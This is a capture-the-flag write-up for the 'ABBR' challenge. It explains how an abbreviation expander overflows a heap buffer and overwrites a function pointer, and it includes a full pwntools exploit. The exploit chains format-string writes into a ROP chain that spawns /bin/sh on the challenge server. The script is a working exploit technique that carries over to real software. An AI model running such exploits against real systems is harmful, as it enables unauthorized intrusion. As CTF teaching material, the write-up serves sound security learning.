# ABBR

## Challenge

The binary takes a string and converts abbreviations to the expanded form.
For example, "ret2" is converted to "return to ", so an input like "ret2libc" will become "return to libc".

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### main source code

```
int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);

  Translator *t = translator_new(0x1000);
  while (1) {
    /* Input data */
    translator_reset(t);
    printf("Enter text: ");
    fgets(t->text, t->size, stdin);
    if (t->text[0] == '\n')
      break;

    /* Expand abbreviation */
    t->translate(t->text);
    printf("Result: %s", t->text);
  }

  return 0;
}
```

### Translator struct

```
typedef struct Translator {
  void (*translate)(char*);
  char *text;
  int size;
} Translator;
```

### english\_expand source code

```
void english_expand(char *text) {
  int i, alen, blen;
  Rule *r;
  char *p, *q;
  char *end = &text[strlen(text)-1]; // pointer to the last character

  /* Replace all abbreviations */
  for (p = text; *p; ++p) {
    for (i = 0; i < sizeof(rules) / sizeof(Rule); i++) {
      r = &rules[i];
      alen = strlen(r->a);
      blen = strlen(r->b);
      if (strncasecmp(p, r->a, alen) == 0) {
        // i.e "i'm pwn noob." --> "i'm pwn XXnoob."
        for (q = end; q > p; --q)
          *(q+blen-alen) = *q;
        // Update end
        end += blen-alen;
        *(end+1) = '\0';
        // i.e "i'm pwn XXnoob." --> "i'm pwn newbie."
        memcpy(p, r->b, blen);
      }
    }
  }
}
```

## Solution

We can see that a `Translator` struct is placed on the heap, which contains a pointer to our input and a pointer to the `translate` function.
By default, this function pointer is set to `english_expand`.

Note that our user input is also on the heap and is allocated before the `Translator` struct.

The program restricts our input to `Translator->size`, but it does not check the length when expanding abbreviations.

By writing an address at the end of our string, and placing abbreviations before it, we can force the `english_expand` function to move our address to replace the `Translator->translate` function pointer.

From here, we can call any function we want, with a controlled string as its first parameter.

We can first call `main` again to place push stack pointers for use later.
`main` is useful as it allows us to pick another function to call after this step.

In the next stack frame, we can make it call `printf` in a loop.
As we control the string, this effectively turns into a format string problem.
The loop allows us to use as many writes as necessary, making it easy to write any value anywhere.
The earlier call to `main` gives us a known stack pointer which points to another stack address.
We can use this to easily pick addresses on the stack to edit.

The binary is staticly linked with musl libs, so we need to place "/bin/sh\x00" on the stack using a ROP chain, then call the `execve` syscall.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 168.119.108.148 --port 10010 abbr
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('abbr')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '168.119.108.148'
port = int(args.PORT or 10010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b*0x00402036
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def writeGadget(address, gadget):
    for i in range(8):
        fmtstr = "%{}c%8$hn".format(address % 0x10000).encode()
        io.sendlineafter(b'Enter text: ', fmtstr)

        fmtstr = b''
        if gadget % 0x100 != 0:
            fmtstr +="%{}c".format(gadget % 0x100).encode()
        fmtstr += b"%12$hhn"
        io.sendlineafter(b'Enter text: ', fmtstr)
        gadget = gadget // 0x100
        address += 1

io = start()

rop = ROP(exe)

distance = 0x4cfb90 - 0x4ceb80 + 0x20
expands = (distance - 0x1000) // 2

payload = flat({
    0x0: expands * b'noob',
    0x1000 - 0x20: exe.sym['main'],
    }, filler = b"x")

io.sendlineafter(b'Enter text: ', payload)
io.sendlineafter(b'Enter text: ', b'a')

payload = flat({
    0x0: expands * b'noob',
    0x1000 - 0x20: exe.sym['main'],
    }, filler = b"x")

io.sendlineafter(b'Enter text: ', payload)
io.sendlineafter(b'Enter text: ', b'a')

payload = flat({
    0x0: expands * b'noob',
    0x1000 - 0x20: exe.sym['printf'],
    }, filler = b"x")

io.sendlineafter(b'Enter text: ', payload)
io.sendlineafter(b'Enter text: ', b'a')
io.sendlineafter(b'Enter text: ', b'%8$p')

stack = int(io.recvline()[:-1], 0)
io.success(hex(stack))

fmtstr = "%{}c%8$hn".format((stack + 0x28) % 0x10000).encode()
io.sendlineafter(b'Enter text: ', fmtstr)

binsh = 0x4c9000
movqword_ptrRDI_RDX = 0x000000000043bbb3

import binascii

writeGadget(stack+0x28, rop.find_gadget(['pop rdi', 'ret'])[0])
io.success("pop rdi")
writeGadget(stack+0x30, binsh)
io.success("*binsh")
writeGadget(stack+0x38, rop.find_gadget(['pop rdx', 'ret'])[0])
io.success("pop rdx")
writeGadget(stack+0x40, int(binascii.hexlify(b"/bin/sh\x00"[::-1]), 16))
io.success("\"/bin/sh\\x00\"")
writeGadget(stack+0x48, movqword_ptrRDI_RDX)
io.success("mov qword ptr [rdi], rdx")
writeGadget(stack+0x50, rop.find_gadget(['pop rsi', 'ret'])[0])
io.success("pop rsi")
writeGadget(stack+0x58, 0)
io.success("0")
writeGadget(stack+0x60, rop.find_gadget(['pop rdx', 'ret'])[0])
io.success("pop rdx")
writeGadget(stack+0x68, 0)
io.success("0")
writeGadget(stack+0x70, rop.find_gadget(['pop rax', 'ret'])[0])
io.success("pop rax")
writeGadget(stack+0x78, 59)
io.success("59")
writeGadget(stack+0x80, rop.find_gadget(['syscall'])[0])
io.success("syscall")

fmtstr = "%{}c%8$hn".format((stack + 0x20) % 0x10000).encode()
io.sendlineafter(b'Enter text: ', fmtstr)

io.sendlineafter(b'Enter text: ', b'')
io.sendlineafter(b'Enter text: ', b'')
io.sendlineafter(b'Enter text: ', b'')

io.interactive()
```

## Flag

`ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}`

